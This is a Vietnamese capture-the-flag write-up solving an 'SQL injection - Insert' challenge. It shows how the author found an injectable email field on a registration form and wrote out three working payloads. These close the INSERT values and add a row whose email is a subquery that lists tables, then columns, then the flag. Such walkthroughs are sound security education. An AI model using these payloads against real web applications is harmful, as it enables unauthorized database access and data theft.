# Challeng: SQL injection - Insert

<img width="1490" height="501" alt="image" src="https://github.com/user-attachments/assets/950a05ed-0c53-4dab-8e59-38dbef8d802d" />

Vào Challenge nó cho một giao diện như vầy 

<img width="419" height="225" alt="image" src="https://github.com/user-attachments/assets/18d6c326-30e3-48e3-92bc-f2e1a9327587" />


Tạo một tài khoản hợp lệ trước đã rồi xem sao 

<img width="377" height="224" alt="image" src="https://github.com/user-attachments/assets/c33bbe6c-975c-4715-8988-7c7d1101b49b" />

Lấy nó đăng nhập lại vào phần Login thì sau đó nó hiển thị thế này 

<img width="361" height="235" alt="image" src="https://github.com/user-attachments/assets/8dea9a52-e0f0-4004-a385-7f6843dac5c0" />



Mình thử fuzz vài payload đơn giản vào trong tab Login thì nó vẫn chỉ báo login failed

vào tab Register , mình thử fuzz vào từng ô , lần lượt sẽ chỉ chèn vào duy nhất một ô những kí tự đặc biệt , 2 ô còn lại thì cứ để những cái hợp lệ coi có ô nào mà không được lọc kĩ hay không thì đã xác định được ô Email có thể SQl Injection được 

<img width="435" height="230" alt="image" src="https://github.com/user-attachments/assets/936bc7f0-c3f5-47e0-806c-503a5404caee" />

Và thử login lại 

<img width="323" height="212" alt="image" src="https://github.com/user-attachments/assets/a240eabf-9096-4255-ae86-476136494782" />


phía backend có thể nó xử lý là
```sql
INSERT INTO users(username,password,email) values('$username','$password','$email')
```
Cơ chế hoạt động như sau , Chúng ta sẽ nhập vào username và password hợp lệ , Còn email chúng ta sẽ truyền lệnh để lấy password admin vào . Khi đó lúc chúng ta đăng nhập lại với username và password chúng ta có , thì login thành công và ở đoạn hiển thị thông tin , mục email nó sẽ hiển thị password admin 

Vấn đề bây giờ là câu truy vấn mà truyền vào nháy đơn thì nó sẽ chỉ là văn bản chết , nó không được thực thi . Trước mắt kiểu gì chúng ta cũng phải đóng cái nháy đơn đó lại .

Nhưng sau khi đóng lại nếu chúng ta có dùng OR hay AND gì ở sau thì nó cũng sẽ bị lỗi cú pháp . Vậy thì giải pháp ở đây là đóng luôn dấu ngoặc tròn kết thúc luôn cái values thứ nhất đó , chúng ta mở ra một values thứ 
```sql
INSERT INTO users(username,password,email) values('$username','$password','$email'),('$username2','$password2','$email2')
```
Dạng như thế , triển khai thôi , từ username cho đến password2 thì cứ điền hợp lệ đi , nơi chèn payload sẽ là email2 , chúng ta sẽ ko dùng nháy đơn ở `email2` , chèn một câu Select vào
```sql
username:dddd111
password: 1
email: abc'), ('mmmm','1',(select group_concat(table_name) from information_schema.tables ))-- -
```
<img width="378" height="228" alt="image" src="https://github.com/user-attachments/assets/15937575-a431-4e89-b847-177493103465" />

Lấy cái `mmmmm` kia đăng nhập lại  Chúng ta có được bảng

<img width="1120" height="381" alt="image" src="https://github.com/user-attachments/assets/ba573a98-3a82-4ce4-9ab3-60038d95ea2d" />

Tiếp tục lấy danh sách cột trong table flag kia
```sql
username: bbbbb111
password: 1
email: abc'), ('kkkk','1',(select group_concat(column_name) from information_schema.columns where table_name = 'flag')) -- -
```
Tương tự chúng ta có được một cột tên flag

<img width="363" height="224" alt="image" src="https://github.com/user-attachments/assets/1414b3ff-7398-4bb2-be66-d7f5bf736261" />

Cuối cùng lấy flag
```sql
username: ccccc111
password: 1
email: abc'),('nnnnn','1',(select flag from flag ))-- -
```

<img width="414" height="226" alt="image" src="https://github.com/user-attachments/assets/b0e77de1-1ca9-466e-880c-89a5265d806b" />

Done Challenge này nhe!!!





